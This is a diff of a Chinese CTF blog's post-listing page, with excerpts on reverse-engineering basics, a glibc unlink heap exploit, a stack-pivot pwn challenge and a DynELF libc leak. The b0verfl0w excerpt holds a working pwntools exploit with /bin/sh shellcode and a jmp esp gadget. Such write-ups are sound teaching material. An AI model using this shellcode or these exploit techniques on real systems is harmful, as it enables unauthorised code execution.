@@ -104,42 +104,6 @@
 
 <article class="post-entry">
 	<header class="entry-header">
-		<h2>CTF | 逆向入门第一篇</h2>
-	</header>
-	<section class="entry-content">
-	 <p>跟着萌新一起逆向入门呦。包括：基本知识点,简单题例子,常见操作
-先来过一遍知识点吧！
-工具介绍  Disassembler 反汇编器 Tracer 记录运行的过程,如函数，指令 Debugger 调试器 Decompiler IDA、geb（支持mips、web assembly?) Emulator (qemu 模拟执行）知道CPU状态 Symbolic execution 符号执行 angr、路径爆炸  具体工具  IDA 支持脚本、手工定义的反汇编规则 Geb 逆安卓 mips web*** Binary ninja 不支持反编译,api好用，通常提供静态分析 R2 命令系统奇怪，支持以太坊智能合约 Retdec capstone  常规逆向 ELF/PE/Mach-O file with x86/x64/arm
-此外还有一些非常常规逆向，比如…不说啦哈哈哈哈
-逆向的一般步骤：信息收集-&gt;定位关键代码-&gt;分析*
-信息收集 Strings(搜看看有没有源码..）/ binwalk file ida -&gt; google/github
-例子
- CISCN 2018 re 酷狗音乐盒  定位关键代码  根据控制流 Data 交叉引用 代码交叉引用 Memory searching &#43;r/w breakpoint.输入数据 内存搜索 记录地址 对该地址下断点 读写断点（保证运行地址不变？） Tracing 例子：youku client reversing  分析代码 Tips...</p>
-	</section>
-	<footer class="entry-footer">
-		<time>August 3, 2018</time>
-	</footer>
-	<a class="entry-link" aria-label="link to CTF | 逆向入门第一篇 post" href="https://yuuoniy.github.io/posts/xman-reversing-1/"></a>
-</article>
-<article class="post-entry">
-	<header class="entry-header">
-		<h2>CTF | 2016 ZCTF note2</h2>
-	</header>
-	<section class="entry-content">
-	 <p>2016 ZCTF note2 writeup 关于 unlink 利用
-unlink 来复习一下 unlink。。 控制堆块的 fd,bk 指针
-FD=P-&gt;fd BK=P-&gt;bkFD-&gt;bk = BKBK-&gt;fd = FD64位：
-fd = &amp;P-0x18bk = &amp;P-0x10效果： P = &amp;P-0X1832 位
-fd = &amp;p-12bk = &amp;p-8效果: p =&amp;p-12可以好好看一下 unlink 宏
-#define unlink(AV, P, BK, FD) { \ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ malloc_printerr (&#34;corrupted size vs. prev_size&#34;); \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk !...</p>
-	</section>
-	<footer class="entry-footer">
-		<time>April 5, 2018</time>
-	</footer>
-	<a class="entry-link" aria-label="link to CTF | 2016 ZCTF note2 post" href="https://yuuoniy.github.io/posts/2016-zctf-note2/"></a>
-</article>
-<article class="post-entry">
-	<header class="entry-header">
 		<h2>Bullet</h2>
 	</header>
 	<section class="entry-content">
@@ -156,6 +120,41 @@ fd = &amp;p-12bk = &amp;p-8效果: p =&amp;p-12可以好好看一下 unlink �
 		<time>March 29, 2018</time>
 	</footer>
 	<a class="entry-link" aria-label="link to Bullet post" href="https://yuuoniy.github.io/posts/bullet/"></a>
+</article>
+<article class="post-entry">
+	<header class="entry-header">
+		<h2>b0verfl0w</h2>
+	</header>
+	<section class="entry-content">
+	 <p>stack privot 题目 溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。
+基本利用思路如下
+利用栈溢出布置shellcode 控制eip指向shellcode处
+第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。
+ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39; 
+size(shellcode&#43;padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 所以我们最后一段需要执行的指令就是
+sub 0x28,espjmp espMemory layout: | Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting |
+from pwn import *sh = process(&#39;./b0verfl0w&#39;)shellcode = &#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#34;;padding = &#39;a&#39;*13jmp_esp = 0x08048504sub_esp_jmp = asm(&#39;sub esp,0x28;jmp esp&#39;)payload = shellcode&#43;padding&#43;p32(jmp_esp)&#43;sub_esp_jmpsh.sendline(payload)sh.interactive()我不明白既然有了 asm(‘sub esp,0x28;jmp esp’) 为什么还需要直接跳转到esp的gadgets。 解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell...</p>
+	</section>
+	<footer class="entry-footer">
+		<time>March 18, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to b0verfl0w post" href="https://yuuoniy.github.io/posts/b0verfl0w/"></a>
+</article>
+<article class="post-entry">
+	<header class="entry-header">
+		<h2>CTF | XDCTF2015-pwn200(DynELF)</h2>
+	</header>
+	<section class="entry-content">
+	 <p>该题用到了 DynELF 技术
+DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。
+p = process(&#39;./xxx&#39;) def leak(address): #各种预处理 payload = &#34;xxxxxxxx&#34; &#43; address &#43; &#34;xxxxxxxx&#34; p.send(payload) #各种处理 data = p.recv(4) return data d = DynELF(leak, elf=ELF(&#34;./xxx&#34;)) #初始化DynELF模块  systemAddress = d.lookup(&#39;system&#39;, &#39;libc&#39;) #在libc文件中搜索system函数的地址 再看 read 函数： 定义函数：ssize_t read(int fd, void * buf, size_t count);  函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数 count 为 0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.
+思路：
+1.调用 main 函数循环利用 2.泄露出 system 地址...</p>
+	</section>
+	<footer class="entry-footer">
+		<time>March 18, 2018</time>
+	</footer>
+	<a class="entry-link" aria-label="link to CTF | XDCTF2015-pwn200(DynELF) post" href="https://yuuoniy.github.io/posts/xdctf2015-pwn200/"></a>
 </article> 
 <footer class="page-footer">
 	<nav class="pagination">
